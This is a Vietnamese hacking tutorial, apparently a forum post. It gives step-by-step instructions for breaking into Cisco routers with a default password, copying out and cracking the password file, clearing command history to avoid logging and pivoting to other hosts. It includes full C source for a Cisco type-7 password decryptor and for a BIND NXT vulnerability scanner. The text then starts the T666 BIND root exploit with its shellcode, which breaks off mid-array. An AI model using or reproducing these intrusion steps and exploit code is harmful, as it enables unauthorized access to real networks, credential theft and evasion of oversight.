+OK ! Cũng chả sao , trong khi đó bạn hãy lập lại 1 kết nối khác cung tới port 23 . Và đăng nhập mật khẩu là " Admin " . 
+
+Các bạn hỏi vì sao password lại la " Admin " . Xin tha rằng đây là password mặc định của chương trình chuyển vận Cisco . ha ha ... Khi đó bạn có thể đăng nhập được vào hệ thống tạm thời , chỉ là tạm thời thôi nha , bởi vì nó sẽ dis bạn ra bất cứ lúc nào . 
+
+Bây giờ bạn đã đăng nhập thành công , hay mau tìm file password . 
+
+Bạn hãy gõ " ? " sẽ có 1 danh sách các lệnh dùng trong hệ thống hiện ra trước mắt bạn ( Tất nhiên bạn chỉ được quyền hạn sử dụng 1 số lệnh trong này thôi vì bạn chỉ là ngời tạm thời trong hệ thống , nhưng thế là đã quá đủ rồi ) Bạn sẽ nhìn thấy 1 lệnh di chuyển , 1 lệnh copy file , 1 lệnh edit file .. hãy dùng lệnh này để đến nơi chứa file password của Admin ( Mấy chú không biết gì về Nix thì phải xem lại nha ) . Khi tìm thấy file passwd thì hãy gửi về cho mình theo địa chỉ IP của chính mình tren port 23 
+
+Nhưng trước khi bạn có thể sent file về cho chính mình bạn phải thiết lập HyperTerminal để đợi tín hiệu từ Cisco Rout . 
+
+Bây giờ bạn sent 1 file từ hệ thống về máy bạn ,HyperTerminal sẽ hỏi bạn liệu bạn có chấp nhận file mà máy chủ gửi cho bạn , bạn đồng ý và tìm đờng dẫn cho file save lại 
+
+
+Vậy là bạn đã có trong tay file chứa password của 1 hệ thống chuyển vận Cisco . 
+
+File đó có thể là passwd ( nếu nó không bị mã hoá bởi shadow ) , Hoặc là file Shadow password . cũng có thể là master.passwd . Cái này phải tuỳ vào kinh nghiệm của mỗi ngời . 
+
+
+III Cách Crack File Password . 
+
+
+Bạn đã vợt qua được phần khó nhất rồi nên việc Crack này chỉ là chuyện nhỏ . 
+
+Cách tôt nhất là bạn nên dùng John the Ripper để Crack nó . Sử dụng cái này rất dễ , bạn chỉ việc đọc hớng dẫn của nó là OK . 
+
+
+Nhưng ngoài ra tôi cũng xin giới thiệu 1 chương trình khác , nó được viết ra chỉ để Crack password của hệ thống Cisco ( Các bạn nên phân biệt password của 1 server chứa website , vơí 1 server chạy Cisco nha , hoàn toàn khác nhau đấy ) . Chương trình này các bạn có thể biên tập trên Linux : 
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdio.h&gt; 
+#include &lt;ctype.h&gt; 
+
+char xlat&#91;&#93; = { 
+
+0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 
+
+0x41, 0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 
+
+0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44 
+
+}; 
+
+
+char pw_str1&#91;&#93; = "password 7 "; 
+
+char pw_str2&#91;&#93; = "enable-password 7 "; 
+
+
+char *pname; 
+
+
+cdecrypt&#40;enc_pw, dec_pw&#41; 
+
+char *enc_pw; 
+
+char *dec_pw; 
+
+{ 
+
+unsigned int seed, i, val = 0; 
+
+
+if&#40;strlen&#40;enc_pw&#41; & 1&#41; 
+
+return&#40;-1&#41;; 
+
+
+seed = &#40;enc_pw&#91;0&#93; - '0'&#41; * 10 + enc_pw&#91;1&#93; - '0'; 
+
+
+if &#40;seed &gt; 15 || !isdigit&#40;enc_pw&#91;0&#93;&#41; || !isdigit&#40;enc_pw&#91;1&#93;&#41;&#41; 
+
+return&#40;-1&#41;; 
+
+
+for &#40;i = 2 ; i &lt;= strlen&#40;enc_pw&#41;; i++&#41; { 
+
+if&#40;i !=2 && !&#40;i & 1&#41;&#41; { 
+
+dec_pw&#91;i / 2 - 2&#93; = val ^ xlat&#91;seed++&#93;; 
+
+val = 0; 
+
+} 
+
+
+val *= 16; 
+
+
+if&#40;isdigit&#40;enc_pw&#91;i&#93; = toupper&#40;enc_pw&#91;i&#93;&#41;&#41;&#41; { 
+
+val += enc_pw&#91;i&#93; - '0'; 
+
+continue; 
+
+} 
+
+
+if&#40;enc_pw&#91;i&#93; &gt;= 'A' && enc_pw&#91;i&#93; &lt;= 'F'&#41; { 
+
+val += enc_pw&#91;i&#93; - 'A' + 10; 
+
+continue; 
+
+} 
+
+
+if&#40;strlen&#40;enc_pw&#41; != i&#41; 
+
+return&#40;-1&#41;; 
+
+} 
+
+
+dec_pw&#91;++i / 2&#93; = 0; 
+
+
+return&#40;0&#41;; 
+
+} 
+
+
+usage&#40;&#41; 
+
+{ 
+
+fprintf&#40;stdout, "Usage: %s -p &lt;encrypted password&gt;\n", pname&#41;; 
+
+fprintf&#40;stdout, " %s &lt;router config file&gt; &lt;output file&gt;\n", pname&#41;; 
+
+
+return&#40;0&#41;; 
+
+} 
+
+
+main&#40;argc,argv&#41; 
+
+int argc; 
+
+char **argv; 
+
+
+{ 
+
+FILE *in = stdin, *out = stdout; 
+
+char line&#91;257&#93;; 
+
+char passwd&#91;65&#93;; 
+
+unsigned int i, pw_pos; 
+
+
+pname = argv&#91;0&#93;; 
+
+
+if&#40;argc &gt; 1&#41; 
+
+{ 
+
+if&#40;argc &gt; 3&#41; { 
+
+usage&#40;&#41;; 
+
+exit&#40;1&#41;; 
+
+} 
+
+
+if&#40;argv&#91;1&#93;&#91;0&#93; == '-'&#41; 
+
+{ 
+
+switch&#40;argv&#91;1&#93;&#91;1&#93;&#41; { 
+
+case 'h': 
+
+usage&#40;&#41;; 
+
+break; 
+
+
+case 'p': 
+
+if&#40;cdecrypt&#40;argv&#91;2&#93;, passwd&#41;&#41; { 
+
+fprintf&#40;stderr, "Error.\n"&#41;; 
+
+exit&#40;1&#41;; 
+
+} 
+
+fprintf&#40;stdout, "password: %s\n", passwd&#41;; 
+
+break; 
+
+
+default: 
+
+fprintf&#40;stderr, "%s: unknow option.", pname&#41;; 
+
+} 
+
+
+return&#40;0&#41;; 
+
+} 
+
+
+if&#40;&#40;in = fopen&#40;argv&#91;1&#93;, "rt"&#41;&#41; == NULL&#41; 
+
+exit&#40;1&#41;; 
+
+if&#40;argc &gt; 2&#41; 
+
+if&#40;&#40;out = fopen&#40;argv&#91;2&#93;, "wt"&#41;&#41; == NULL&#41; 
+
+exit&#40;1&#41;; 
+
+} 
+
+
+while&#40;1&#41; { 
+
+for&#40;i = 0; i &lt; 256; i++&#41; { 
+
+if&#40;&#40;line&#91;i&#93; = fgetc&#40;in&#41;&#41; == EOF&#41; { 
+
+if&#40;i&#41; 
+
+break; 
+
+
+fclose&#40;in&#41;; 
+
+fclose&#40;out&#41;; 
+
+return&#40;0&#41;; 
+
+} 
+
+if&#40;line&#91;i&#93; == '\r'&#41; 
+
+i--; 
+
+
+if&#40;line&#91;i&#93; == '\n'&#41; 
+
+break; 
+
+} 
+
+pw_pos = 0; 
+
+line&#91;i&#93; = 0; 
+
+
+if&#40;!strncmp&#40;line, pw_str1, strlen&#40;pw_str1&#41;&#41;&#41; 
+
+pw_pos = strlen&#40;pw_str1&#41;; 
+
+
+if&#40;!strncmp&#40;line, pw_str2, strlen&#40;pw_str2&#41;&#41;&#41; 
+
+pw_pos = strlen&#40;pw_str2&#41;; 
+
+
+if&#40;!pw_pos&#41; { 
+
+fprintf&#40;stdout, "%s\n", line&#41;; 
+
+continue; 
+
+} 
+
+
+if&#40;cdecrypt&#40;&line&#91;pw_pos&#93;, passwd&#41;&#41; { 
+
+fprintf&#40;stderr, "Error.\n"&#41;; 
+
+exit&#40;1&#41;; 
+
+} 
+
+else { 
+
+if&#40;pw_pos == strlen&#40;pw_str1&#41;&#41; 
+
+fprintf&#40;out, "%s", pw_str1&#41;; 
+
+else 
+
+fprintf&#40;out, "%s", pw_str2&#41;; 
+
+
+fprintf&#40;out, "%s\n", passwd&#41;; 
+
+} 
+
+} 
+
+} 
+
+
+
+Nếu bạn không chạy Linux , mà chạy Windown chẳng han . Thì bạn lại phải cần 1 chương trình brute-force , nó sẽ cho phép ban chay John the Ripper hoặc Password-Cracker trên Windown . Và sau đó hãy kiên nhẫn chờ đợi . Một hệ thống lớn đang nằm trong tay bạn . 
+
+
+
+IV Cách sử dụng Router Cisco 
+
+
+Bạn đã có trong tay 1 password của hên thống Cisco , bây giờ hãy làm chủ cái công nghệ tuyệt vời này . Bạn hãy Connect tới hệ thống &#40;Bạn vẫn còn nhớ IP của nó chứ&#41; với password hợp pháp . Nhưng nếu không muốn bị log IP thì hãy thông qua 1 proxy server . 
+
+
+Bạn đã đăng nhập được vào bên trong , Lúc này hệ thống sẽ ghi lại toàn bộ những hành động của bạn bên trong server &#40;nó giống nhưcái History cua IE&#41; . Bạn không muốn mình bị theo dõi như vậy thì hãy gõ lệnh sau : 
+
+
+terminal history size 0 
+
+
+Bây giờ nó sẽ không nhớ bất kỳ cái gì về bạn nữa , chúng ta có thể yên tâm mà khai thác sử dung Rounter này . 
+
+Bạn muốn cách sử dụng Rounter ? Hãy gõ " ? " , một loạt các danh sách lệnh của chương trinh Rounter Cisco hiện ra . Và bạn có thể sử dụng hầu hết nó . 
+
+
+Những chương trình vận chuyển Cisco thông thường cho telnet , như vậy bạn có thể dùng telnet kết nối với những hệ thống khác &#40;Bạn thấy nó sớng không , Hack được 1 hệ thống ta có thể có quyền vào những hệ thống khác mà Cisco này đang làm việc&#41; 
+
+Bạn có thể sử dụng hệ thống Rounter để chặn đứng các gói dữ liệu được chuyền tới và chuyền đi thông qua hệ thống Cisco này . Hoặc bạn có thể sao chép các dữ liệu các gói hàng , nhưng trong bài viết này tôi sẽ không đề cập đến vấn đề đó vì nó quá sức nguy hiểm 
+
+
+V. Lời Kết 
+
+
+Bạn đừng tức giận hay khóc khi mà không Hack được 1 hệ thống Cisco lần đầu tiên , và thậm chí cả sau này . Nó cần sự thực hành kiên nhẫn từ bạn chứ không như kiểu Hack server khác là 1 nhát được ngay . 
+
+Hay tỉ mỉ trong từng bớc bạn sẽ thành công ! 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+Hack BIND 8.2/8.2.1 qua bug "NXT" 
+
+
+Các máy chủ tên miền &#40;DNS server&#41; chạy BIND 8.2/8.2.1 không xử lí chính xác các record NXT. Điều này tạo điều kiện cho attacker có thể làm tràn bộ đệm của BIND và thi hành các mã lệnh độc đoán trên máy chủ tên miền mà cụ thể nhất là lấy root &#40;theo CA-99-14, ngày 10/11/1999&#41; 
+
+Dưới đây là cách để hack các máy chủ tên miền chạy BIND 8.2/8.2.1 gặp bug "nxt" nhưng chưa được patch 
+
+Bước 1: scan các DNS server gặp bug "nxt" bằng CBIND &#40;cảm ơn Nguyễn Xuân Bình nha&#41; 
+
+/* BIND NXT vulnerable SCANNER - CBIND */ 
+
+#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;wait.h&gt;#include &lt;netdb.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt; 
+/* DO NOT EDIT THIS LINE */ 
+#define SCAN_EXE "./nmap -p 53 " 
+
+/* EDIT: directory of NMAP */ 
+#define SCAN_DIR "/home/lb0gspm/tmp/nmap/" 
+
+/* EDIT: directory of CBIND and it's temporary files */ 
+#define CBIND_DIR "/home/lb0gspm/tmp/cbind/" 
+#define R1_DIR "/home/lb0gspm/tmp/cbind/result1.cbind" 
+#define R2_DIR "/home/lb0gspm/tmp/cbind/result2.cbind" 
+
+int Scan&#40; char *ip &#41;; 
+char *GetSubnet&#40; char *ip &#41;; 
+char *ChangeSubnet&#40; char *ip, char *subnet &#41;; 
+char *itoa&#40; int i &#41;; 
+
+int main&#40; int argc, char *argv&#91;&#93; &#41; 
+{ 
+struct in_addr addr; 
+struct hostent *host_entry; 
+unsigned short int option&#91;3&#93;, i, wait_st; 
+unsigned char *name; 
+unsigned char *cmd; 
+unsigned char *ip, *subnet, *ip_s; 
+unsigned char *temp; 
+FILE *fp; 
+
+printf&#40; "Check BIND v 2.00b \n" &#41;; 
+printf&#40; "Bind NXT vulnerablity scanner\n\n" &#41;; 
+
+name = &#40;char *&#41;malloc&#40; 200 &#41;; 
+ip = &#40;char *&#41;malloc&#40; 16 &#41;; 
+ip_s = &#40;char *&#41;malloc&#40; 16 &#41;; 
+subnet = &#40;char *&#41;malloc&#40; 4 &#41;; 
+cmd = &#40;char *&#41;malloc&#40; 50 &#41;; 
+
+if&#40; argc == 1 &#41; 
+{ 
+printf&#40; "Options: \n" &#41;; 
+printf&#40; " -s SUB-NET SCAN &#40; SLOW BUT HIGH PRECISE &#41;\n" &#41;; 
+printf&#40; " -f SUB-NET SCAN &#40; FAST BUT LOW PRECISE / NMAP REQUIRE &#41;\n" &#41;; 
+printf&#40; " -i PRINT INFOMATION\n\n" &#41;; 
+printf&#40; "Examples: \n" &#41;; 
+printf&#40; " cbind victim.com &#40; IT WILL SCAN IF TARGET IS VULNERABLE OR NOT &#41;\n" &#41;; 
+printf&#40; " cbind victim.com -s &#40; IT WILL SCAN ALL SUB-NETs IN DETAIL &#41;\n" &#41;; 
+printf&#40; " cbind -f victim.com &#40; IT WILL SCAN SUB-NETs LOW PRECISE &#41;\n\n" &#41;; 
+exit&#40;0&#41;; 
+} else { 
+option&#91;0&#93; = 0; 
+option&#91;1&#93; = 0; 
+option&#91;2&#93; = 0; 
+for&#40; i = 1; i &lt; argc; i++ &#41; 
+{ 
+if&#40; strcmp&#40; argv&#91;i&#93;, "-s" &#41; == 0 &#41; 
+{ 
+if&#40; option&#91;2&#93; == 1 &#41; 
+{ 
+printf&#40; "Can not use options -s, -f at the same time.\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+if&#40; option&#91;0&#93; == 1 &#41; 
+{ 
+printf&#40; "Can not use option -s with -i.\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+printf&#40; "Sub-net&#40; high precise &#41; scan mode ACTIVATED.\n" &#41;; 
+printf&#40; "It can takes long.\n\n" &#41;; 
+option&#91;1&#93; = 1; 
+continue; 
+} 
+if&#40; strcmp&#40; argv&#91;i&#93;, "-f" &#41; == 0 &#41; 
+{ 
+if&#40; option&#91;1&#93; == 1 &#41; 
+{ 
+printf&#40; "Can not use options -s, -f at the same time.\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+if&#40; option&#91;0&#93; == 1 &#41; 
+{ 
+printf&#40; "Can not use options -f with -i.\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+printf&#40; "Sub-net&#40; low precise &#41; scan mode ACTIVATED.\n" &#41;; 
+printf&#40; "It require NMAP 2.07 or higher version.\n\n" &#41;; 
+option&#91;2&#93; = 1; 
+continue; 
+} 
+if&#40; strcmp&#40; argv&#91;i&#93;, "-i" &#41; == 0 &#41; 
+{ 
+if&#40; &#40;option&#91;1&#93; == 1&#41; || &#40;option&#91;2&#93; == 1&#41; &#41; 
+{ 
+printf&#40; "Can not use option -i with -s&#40;or -f&#41;.\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+option&#91;0&#93; = 1; 
+continue; 
+} 
+strcpy&#40; name, argv&#91;i&#93; &#41;; 
+} 
+} 
+
+if&#40; geteuid&#40;&#41; != 0 &#41; 
+{ 
+printf&#40; "Error! You are not ROOT!\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+
+if&#40; &#40;name&#91;0&#93; &lt;= '0'&#41; || &#40;name&#91;0&#93; &gt;= '9'&#41; &#41; 
+{ 
+host_entry = gethostbyname&#40; name &#41;; 
+if&#40; host_entry == NULL &#41; 
+{ 
+if&#40; option&#91;0&#93; != 1 &#41; { 
+printf&#40; "Can not scan %s.\n", name &#41;; 
+exit&#40;0&#41;; 
+} 
+} 
+if&#40; option&#91;0&#93; != 1 &#41; { 
+addr = *&#40;&#40;struct in_addr *&#41;host_entry-&gt;h_addr&#41;; 
+ip = &#40;unsigned char *&#41;inet_ntoa&#40; addr &#41;; 
+subnet = GetSubnet&#40; ip &#41;; 
+} 
+} 
+if&#40; &#40;name&#91;0&#93; &gt;= '0'&#41; && &#40;name&#91;0&#93; &lt;= '9'&#41; &#41; 
+{ 
+host_entry = gethostbyaddr&#40; name, strlen&#40;name&#41;, AF_INET &#41;; 
+if&#40; host_entry == NULL &#41; 
+{ 
+if&#40; option&#91;0&#93; != 1 &#41; { 
+printf&#40; "Can not scan %s.\n", name &#41;; 
+exit&#40;0&#41;; 
+} 
+} 
+if&#40; option&#91;0&#93; != 1 &#41; { 
+addr = *&#40;&#40;struct in_addr *&#41;host_entry-&gt;h_addr&#41;; 
+ip = &#40;unsigned char *&#41;inet_ntoa&#40; addr &#41;; 
+subnet = GetSubnet&#40; ip &#41;; 
+} 
+} 
+
+if&#40; &#40;option&#91;1&#93; == 0&#41; && &#40;option&#91;2&#93; == 0&#41; && &#40;option&#91;0&#93; != 1&#41; &#41; 
+{ 
+Scan&#40; ip &#41;; 
+printf&#40; "Scanning Done.\n" &#41;; 
+remove&#40; R1_DIR &#41;; 
+remove&#40; R2_DIR &#41;; 
+exit&#40;0&#41;; 
+} 
+if&#40; option&#91;1&#93; == 1 &#41; 
+{ 
+for&#40; i = 0; i &lt; 256; i++ &#41; 
+{ 
+if&#40; fork&#40;&#41; == 0 &#41; 
+{ 
+strcpy&#40; subnet, itoa&#40; i &#41; &#41;; 
+ip_s = ChangeSubnet&#40; ip, subnet &#41;; 
+Scan&#40; ip_s &#41;; 
+remove&#40; R1_DIR &#41;; 
+remove&#40; R2_DIR &#41;; 
+exit&#40;0&#41;; 
+} else { 
+wait&#40; NULL &#41;; 
+} 
+continue; 
+} 
+printf&#40; "Scanning Done.\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+if&#40; option&#91;2&#93; == 1 &#41; 
+{ 
+strcpy&#40; cmd, SCAN_EXE &#41;; 
+strcat&#40; cmd, name &#41;; 
+strcat&#40; cmd, "/24" &#41;; 
+strcat&#40; cmd, " &gt; " &#41;; 
+strcat&#40; cmd, R1_DIR &#41;; 
+chdir&#40; SCAN_DIR &#41;; 
+system&#40; cmd &#41;; 
+
+strcpy&#40; cmd, "grep \"Interesting\" " &#41;; 
+strcat&#40; cmd, R1_DIR &#41;; 
+strcat&#40; cmd, " &gt; " &#41;; 
+strcat&#40; cmd, R2_DIR &#41;; 
+system&#40; cmd &#41;; 
+
+if&#40; &#40; fp = fopen&#40; R2_DIR, "r" &#41; &#41; &lt; 0 &#41; 
+{ 
+printf&#40; "File Open Error!\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+
+while&#40; 1 &#41; 
+{ 
+bzero&#40; name, 200 &#41;; 
+temp = &#40;char *&#41;malloc&#40; 200 &#41;; 
+strcpy&#40; temp, " " &#41;; 
+temp = fgets&#40; temp, 100, fp &#41;; 
+if&#40; temp == NULL &#41; break; 
+if&#40; temp&#91;21&#93; == ' ' &#41; 
+{ 
+for&#40; i = 0; i &lt; 16; i++ &#41; 
+{ 
+if&#40; &#40;temp&#91;i+23&#93; != ' '&#41; && &#40;temp&#91;i+23&#93; != '&#41;'&#41; &#41; 
+{ 
+if&#40; &#40;temp&#91;i+23&#93; &gt;= '0'&#41; && &#40;temp&#91;i+23&#93; &lt;= '9'&#41; &#41; 
+{ 
+name&#91;i&#93; = temp&#91;i+23&#93;; 
+} else { 
+if&#40; temp&#91;i+23&#93; == '.' &#41; 
+name&#91;i&#93; = temp&#91;i+23&#93;; 
+} 
+} 
+} 
+} 
+if&#40; temp&#91;21&#93; != ' ' &#41; 
+{ 
+for&#40; i = 0; i &lt; 50; i++ &#41; 
+{ 
+if&#40; temp&#91;i+21&#93; != ' ' &#41; name&#91;i&#93; = temp&#91;i+21&#93;; 
+} 
+} 
+
+Scan&#40; name &#41;; 
+free&#40;temp&#41;; 
+
+} 
+remove&#40; R1_DIR &#41;; 
+remove&#40; R2_DIR &#41;; 
+} 
+if&#40; option&#91;0&#93; == 1 &#41; 
+{ 
+printf&#40; "Creator : Laks Bluesky\n" &#41;; 
+printf&#40; "E-mail : lb0gspm@hanmail.net\n\n" &#41;; 
+printf&#40; "Version : 2.00 beta\n\n" &#41;; 
+printf&#40; "2000.06.19\n" &#41;; 
+exit&#40;0&#41;; 
+} 
+} 
+
+char *itoa&#40; int i &#41; 
+{ 
+char *ret; 
+char c; 
+int count; 
+
+ret = &#40;char *&#41;malloc&#40; 4 &#41;; 
+
+count = 1; 
+if&#40; i &gt; 9 &#41; count = 2; 
+if&#40; i &gt; 99 &#41; count = 3; 
+
+if&#40; count == 1 &#41; 
+{ 
+c = i+48; 
+ret&#91;0&#93; = c; 
+ret&#91;1&#93; = '\0'; 
+return ret; 
+} 
+
+if&#40; count == 2 &#41; 
+{ 
+c = i / 10; 
+i = i - &#40;c*10&#41;; 
+
+ret&#91;0&#93; = c+48; 
+ret&#91;1&#93; = i+48; 
+ret&#91;2&#93; = '\0'; 
+return ret; 
+} 
+
+if&#40; count == 3 &#41; 
+{ 
+c = i / 100; 
+i = i - &#40;c*100&#41;; 
+
+ret&#91;0&#93; = c+48; 
+
+c = i / 10; 
+i = i - &#40;c*10&#41;; 
+
+ret&#91;1&#93; = c+48; 
+ret&#91;2&#93; = i+48; 
+ret&#91;3&#93; = '\0'; 
+return ret; 
+} 
+} 
+
+char *ChangeSubnet&#40; char *ip, char *subnet &#41; 
+{ 
+char *ip_s; 
+int count = 0, i = 0; 
+
+ip_s = &#40;char *&#41;malloc&#40; 16 &#41;; 
+
+strcpy&#40; ip_s, ip &#41;; 
+
+for&#40; count = 0; count != 3; count = count &#41; 
+{ 
+if&#40; ip_s&#91;i&#93; == '.' &#41; 
+{ 
+count++; 
+i++; 
+continue; 
+} 
+i++; 
+} 
+
+ip_s&#91;i++&#93; = subnet&#91;0&#93;; 
+ip_s&#91;i++&#93; = subnet&#91;1&#93;; 
+ip_s&#91;i++&#93; = subnet&#91;2&#93;; 
+ip_s&#91;i++&#93; = subnet&#91;3&#93;; 
+
+return ip_s; 
+} 
+
+char *GetSubnet&#40; char *ip &#41; 
+{ 
+char *ret; 
+int count = 0, i = 0; 
+
+ret = &#40;char *&#41;malloc&#40; 4 &#41;; 
+
+for&#40; count = 0; count != 3; count = count &#41; 
+{ 
+if&#40; ip&#91;i&#93; == '.' &#41; 
+{ 
+count++; 
+i++; 
+continue; 
+} 
+i++; 
+} 
+
+ret&#91;0&#93; = ip&#91;i++&#93;; 
+ret&#91;1&#93; = ip&#91;i++&#93;; 
+ret&#91;2&#93; = ip&#91;i++&#93;; 
+ret&#91;3&#93; = ip&#91;i++&#93;; 
+
+return ret; 
+} 
+
+int Scan&#40; char *ip &#41; 
+{ 
+unsigned short int i; 
+unsigned char c; 
+unsigned char *cmd; 
+unsigned char *version; 
+FILE *fp; 
+struct stat result; 
+
+cmd = &#40;char *&#41;malloc&#40; 200 &#41;; 
+version = &#40;char *&#41;malloc&#40; 9 &#41;; 
+
+printf&#40; "Scanning... %s\n", ip &#41;; 
+
+strcpy&#40; cmd, "dig @&quot; &#41;; 
+strcat&#40; cmd, ip &#41;; 
+strcat&#40; cmd, " version.bind chaos txt &gt; " &#41;; 
+strcat&#40; cmd, R1_DIR &#41;; 
+strcat&#40; cmd, " 2&gt; /dev/null" &#41;; 
+system&#40; cmd &#41;; 
+
+strcpy&#40; cmd, "grep \"VERSION.BIND.\" " &#41;; 
+strcat&#40; cmd, R1_DIR &#41;; 
+strcat&#40; cmd, " &gt; " &#41;; 
+strcat&#40; cmd, R2_DIR &#41;; 
+system&#40; cmd &#41;; 
+
+stat&#40; R2_DIR, &result &#41;; 
+
+if&#40; result.st_size &lt; 30 &#41; 
+{ 
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+
+if&#40; &#40; fp = fopen&#40; R2_DIR, "r" &#41; &#41; &gt;= 0 &#41; 
+{ 
+for&#40; i = 0; i &lt; 29; i++ &#41; 
+{ 
+c = fgetc&#40; fp &#41;; 
+} 
+
+for&#40; i = 0; i &lt; 9; i++ &#41; 
+{ 
+c = fgetc&#40; fp &#41;; 
+
+if&#40; c == '"' &#41; 
+{ 
+version&#91;i&#93; = '\0'; 
+break; 
+} 
+
+version&#91;i&#93; = c; 
+} 
+} else { 
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+
+if&#40; strcmp&#40; version, "8.2" &#41; == 0 &#41; 
+{ 
+printf&#40; "%s: IT IS VULNERABLE! ", ip &#41;; 
+printf&#40; "Try it. \n" &#41;; 
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+
+if&#40; strcmp&#40; version, "8.2.1" &#41; == 0 &#41; 
+{ 
+printf&#40; "%s: IT IS VULNERABLE! ", ip &#41;; 
+printf&#40; "Try it. \n" &#41;; 
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+
+if&#40; strcmp&#40; version, "8.2.2" &#41; == 0 &#41; 
+{ 
+printf&#40; "%s: IT IS VULNERABLE! ", ip &#41;; 
+printf&#40; "Try it. \n" &#41;; 
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+
+if&#40; strcmp&#40; version, "8.2.2-P5" &#41; == 0 &#41; 
+{ 
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+
+if&#40; strcmp&#40; version, "8.1.2" &#41; == 0 &#41; 
+{ 
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+
+chdir&#40; CBIND_DIR &#41;; 
+return 0; 
+} 
+* Bạn có thể dùng hai tiện ích sẵn có trong Linux là DIG và NSLOOKUP để nhận diện version của BIND 
+
+NSLOOKUP 
+
+# nslookup 
+Default Server: ns.yourco.bogus 
+Address: 333.333.333.333 
+&gt; set class=chaos&gt; set type=txt 
+&gt; version.bind 
+Server: ns.yourco.bogus 
+Address: 333.333.333.333 
+VERSION.BIND text = "8.2.2-P5" 
+&gt;DIG &#40;cú pháp lệnh: dig @&lt;server_ip&gt; &lt;domain&gt; &lt;query-type&gt; &lt;query-class&gt;&#41; 
+
+dig version.bind txt chaos @&lt;server&gt;hoặc 
+
+dig @ txt chaos version.bind 
+Nếu bạn thấy trên màn hình 8.2 hoặc 8.2.2 nghĩa là server này có thể gặp bug "nxt" 
+
+Bước 2: lấy root shell bằng T666 
+
+#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;time.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;arpa/nameser.h&gt;#include &lt;netdb.h&gt; 
+char linuxcode&#91;&#93;= 
+{0xe9,0xac,0x1,0x0,0x0,0x5e,0x89,0x76,0xc,0x8d,0x46,0x8,0x89,0x46,0x10,0x8d, 
+0x46,0x2e,0x89,0x46,0x14,0x56,0xeb,0x54,0x5e,0x89,0xf3,0xb9,0x0,0x0,0x0,0x0, 
+0xba,0x0,0x0,0x0,0x0,0xb8,0x5,0x0,0x0,0x0,0xcd,0x80,0x50,0x8d,0x5e,0x2,0xb9, 
+0xff,0x1,0x0,0x0,0xb8,0x27,0x0,0x0,0x0,0xcd,0x80,0x8d,0x5e,0x2,0xb8,0x3d,0x0, 
+0x0,0x0,0xcd,0x80,0x5b,0x53,0xb8,0x85,0x0,0x0,0x0,0xcd,0x80,0x5b,0xb8,0x6, 
+0x0,0x0,0x0,0xcd,0x80,0x8d,0x5e,0xb,0xb8,0xc,0x0,0x0,0x0,0xcd,0x80,0x89,0xf3, 
+0xb8,0x3d,0x0,0x0,0x0,0xcd,0x80,0xeb,0x2c,0xe8,0xa7,0xff,0xff,0xff,0x2e,0x0, 
+0x41,0x44,0x4d,0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f, 
+0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f, 
+0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x0,0x5e,0xb8,0x2,0x0,0x0,0x0,0xcd,0x80,0x89, 
+0xc0,0x85,0xc0,0xf,0x85,0x8e,0x0,0x0,0x0,0x89,0xf3,0x8d,0x4e,0xc,0x8d,0x56, 
+0x18,0xb8,0xb,0x0,0x0,0x0,0xcd,0x80,0xb8,0x1,0x0,0x0,0x0,0xcd,0x80,0xe8,0x75, 
+0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x74,0x68,0x69,0x73,0x69,0x73, 
+0x73,0x6f,0x6d,0x65,0x74,0x65,0x6d,0x70,0x73,0x70,0x61,0x63,0x65,0x66,0x6f, 
+0x72,0x74,0x68,0x65,0x73,0x6f,0x63,0x6b,0x69,0x6e,0x61,0x64,0x64,0x72,0x69, 
+0x6e,0x79,0x65,0x61,0x68,0x79,0x65,0x61,0x68,0x69,0x6b,0x6e,0x6f,0x77,0x74, 
+0x68,0x69,0x73,0x69,0x73,0x6c,0x61,0x6d,0x65,0x62,0x75,0x74,0x61,0x6e,0x79, 
+0x77,0x61,0x79,0x77,0x68,0x6f,0x63,0x61,0x72,0x65,0x73,0x68,0x6f,0x72,0x69, 
+0x7a,0x6f,0x6e,0x67,0x6f,0x74,0x69,0x74,0x77,0x6f,0x72,0x6b,0x69,0x6e,0x67, 
+0x73,0x6f,0x61,0x6c,0x6c,0x69,0x73,0x63,0x6f,0x6f,0x6c,0xeb,0x86,0x5e,0x56, 
+0x8d,0x46,0x8,0x50,0x8b,0x46,0x4,0x50,0xff,0x46,0x4,0x89,0xe1,0xbb,0x7,0x0, 
